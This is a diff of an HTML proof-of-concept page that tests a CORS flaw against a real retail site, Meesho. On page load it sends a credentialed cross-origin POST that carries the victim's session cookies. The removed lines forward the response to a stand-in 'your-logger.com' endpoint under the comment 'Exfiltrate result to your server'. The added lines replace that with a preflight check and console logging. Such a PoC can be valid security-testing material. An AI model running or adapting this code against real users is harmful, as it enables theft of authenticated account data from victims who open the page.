@@ -1,45 +1,58 @@
 <!DOCTYPE html>
 <html>
-<head><title>Meesho CORS Test</title></head>
+<head><title>Meesho CORS Debug</title></head>
 <body>
-<h2>Meesho CORS PoC - Open this after logging into Meesho</h2>
+<h2>Meesho CORS Test - Check Console (F12)</h2>
 
 <script>
 async function testCORS() {
-  const url = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB";
+  const targetUrl = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB";
+
+  console.log("Starting test from origin:", window.location.origin);
 
   try {
-    const res = await fetch(url, {
-      method: "POST",
-      credentials: "include",        // This sends your Meesho cookies
+    // First do manual preflight simulation
+    console.log("Sending OPTIONS preflight...");
+    
+    const preflight = await fetch(targetUrl, {
+      method: "OPTIONS",
       headers: {
-        "Content-Type": "text/plain;charset=UTF-8",
-        "Origin": window.location.origin   // Uses your current domain automatically
-      },
-      body: "test data from attacker"     // You can change this
+        "Origin": window.location.origin,
+        "Access-Control-Request-Method": "POST",
+        "Access-Control-Request-Headers": "Content-Type"
+      }
     });
 
-    console.log("Status:", res.status);
-    console.log("Headers:", [...res.headers]);
+    console.log("Preflight Status:", preflight.status);
+    console.log("Preflight Headers:", Object.fromEntries(preflight.headers));
+
+    // Now try the actual POST
+    const res = await fetch(targetUrl, {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": window.location.origin
+      },
+      body: JSON.stringify({ test: "data", timestamp: Date.now() })
+    });
+
+    console.log("POST Status:", res.status);
+    console.log("Response Headers:", Object.fromEntries(res.headers));
 
     const data = await res.text();
     console.log("Response Body:", data);
 
-    // Exfiltrate result to your server
-    if (data && data.length > 2) {
-      fetch(`https://your-logger.com/log?status=${res.status}&data=${encodeURIComponent(data)}`);
-      alert("✅ Got response! Check browser console.");
-    } else {
-      console.log("Empty or no data returned");
+    if (data.length > 5) {
+      alert("✅ Got real data! Check console.");
     }
 
   } catch (e) {
-    console.error("Fetch failed:", e);
-    alert("Request blocked by CORS or other error. Check console.");
+    console.error("❌ Error:", e);
+    alert("Blocked - Check console for details");
   }
 }
 
-// Run automatically
 testCORS();
 </script>
 </body>
